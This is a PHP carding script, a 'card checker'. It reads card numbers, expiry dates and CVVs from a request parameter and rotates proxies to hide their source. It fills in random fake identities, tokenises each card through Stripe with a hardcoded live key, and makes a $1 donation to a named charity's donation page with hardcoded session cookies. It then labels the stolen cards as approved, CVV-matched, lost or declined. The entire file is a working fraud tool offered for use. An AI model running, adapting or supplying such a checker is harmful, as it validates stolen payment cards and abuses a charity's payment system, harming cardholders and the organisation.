<?php





////////////////////////////===[https://guatemalanproject.org/donate/]
/// Every thing is done Now ADD Proxies in Proxy.txt file and use

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
function binsforeveryoneproxys()
{
  $poxySocks = file("Proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = binsforeveryoneproxys();
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

if(file_exists(getcwd().('/cookie.txt'))){
  @unlink('cookie.txt'); 
}

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
/////////========Luminati
////////=========Socks Proxy

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods'); ////This may differ from site to site
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json', 
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/v3/controller-7d57a67a41c5bdc5f7fdce48749996f2.html',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[address][postal_code]=10080&guid=958d20ae-8366-419c-92c9-1588fb207f20&muid=b2c69a63-95ab-498b-8c3f-5a6d66b16039&sid=e0c4e229-61be-4f29-b9d4-ebe2585b02bf&pasted_fields=number&payment_user_agent=stripe.js%2Ff41aca09%3B+stripe-js-v3%2Ff41aca09&time_on_page=25226&referrer=https%3A%2F%2Fajmuste.org%2Fcivicrm%2Fcontribute%2Ftransact%3Freset%3D1%26id%3D20&key=pk_live_nmBANbqxfqp05UaWMirWm1mJ');
$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"id": "','"')));

////////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

$ch = curl_init();

// /////////========Luminati
// ////////=========Socks Proxy
curl_setopt($ch, CURLOPT_URL, 'https://ajmuste.org/civicrm/stripe/confirm-payment');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//   'Host: #',    [If No Host Data On Site Dont Uncomment It]  
   'accept: */*',
   'content-type: application/x-www-form-urlencoded; charset=UTF-8',
   'cookie: __cfduid=d818e7c9d624e867296c7b05e766456e51585158651; SSESSb0015206cd86f78821285fbcf0736d3c=hvn3u27t1mBdJKezre2kn4fjvAKf1RnXA5L7FsjC9-g; has_js=1; __stripe_mid=b2c69a63-95ab-498b-8c3f-5a6d66b16039; __stripe_sid=e0c4e229-61be-4f29-b9d4-ebe2585b02bf',
   'Origin: https://ajmuste.org',
   'referer: https://ajmuste.org/civicrm/contribute/transact?reset=1&id=20',
   'Sec-Fetch-Mode: cors',
 ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_id='.$token.'&amount=1.00&currency=USD&id=1&description=Donate+to+European+Center+for+Constitutional+and+Human+Rights+%7C+A.J.+Muste+Memorial+Institute');



 $result = curl_exec($ch);
 $message = trim(strip_tags(getStr($result,'"message":"','"'))); 
 


////////////////////////////===[Card Response]

if(strpos($result, '"cvc_check": "pass"')){

  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";

  }
  elseif(strpos($result, "Thank You For Donation." )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "Thank You." )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>SUCCESS CHARGED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result,'"status": "succeeded"')){
      echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "incorrect_zip" )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "Success" )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>SUCCESSFULY CHARGED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "succeeded." )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result,'"type":"one-time"')){
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 SUPREMO 👑★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "insufficient_funds")) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "lost_card" )) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-warning'>LOST CARD</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "stolen_card" )) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-warning'>STOLEN CARD</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "Your card's security code is incorrect.")) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>CCN MATCHED</i></font> <font class='badge badge-success'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "incorrect_cvc" )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 SUPREMO 👑★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-light'>CCN MATCHED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "pickup_card" )) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Aprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-warning'>STOLEN OR LOST</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, 'Your card has expired.' )) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CARD EXPIRED</i></font><br>";
  }
  elseif(strpos($result, "expired_card" )) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CARD EXPIRED</i></font><br>";
  }
  elseif(strpos($result, 'Your card number is incorrect.')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i></font><br>";
  }
  elseif(strpos($result, "incorrect_number")) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i></font><br>";
  }
  elseif(strpos($result, "service_not_allowed")) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ 👑 SUPREMO 👑★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>SERVICE NOT ALLOWED</i></font><br>";
  }
  elseif(strpos($result, "do_not_honor")) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-warning'>DO NOT HONOR</i></font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-warning'>GENERIC DECLINED</i></font><br>";
  }
  elseif(strpos($result, 'Your card was declined.')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CARD DECLINED</i></font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ 👑 SUPREMO 👑★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>GENERIC DECLINED</i></font><br>";
  }
  elseif(strpos($result,'"cvc_check": "fail"')){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-warning'>CVC_CHECKED : Fail</i></font><br>";
  }
  elseif(strpos($result,"parameter_invalid_empty")){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>MISSING CARD DETAIL</i></font><br>";
  }
  elseif(strpos($result,"lock_timeout")){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-warning'>CARD NOT CHECK</i></font><br>";
  }
  elseif (strpos($result, 'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i></font><br>";
  }
  elseif(strpos($result,"transaction_not_allowed")){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i></font><br>";
  }
  elseif(strpos($result,"three_d_secure_redirect")){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ SUPREMO ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i></font><br>";
  }
  elseif(strpos($result, 'Card is declined by your bank, please contact them for additional primaryrmation.')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ SUPREMO ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>3D SECURED</i></font><br>";
  }
  elseif(strpos($result,"missing_payment_primaryrmation")){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ SUPREMO ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>MISSING PAYMENT PRIMARYRMATION</i></font><br>";
  }
  elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ SUPREMO ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>MISSING CREDIT CARD NUMBER</i></font><br>";
}
elseif(strpos($result, "card_not_supported")) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-warning'>CARD NOT SUPPORTED</i></font><br>";
}
elseif(strpos($result, 'Your card is not supported.')) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-warning'>CARD NOT SUPPORTED</i></font><br>";
}
elseif(strpos($result, 'fraudulent')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ SUPREMO ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>Fraudulent</i></font><br>";
} 
else {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ 👑 SUPREMO 👑 ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>Server Failure/Error Not Listed</i></font><br>";
} 

curl_close($ch);
ob_flush();

//echo $result;
?>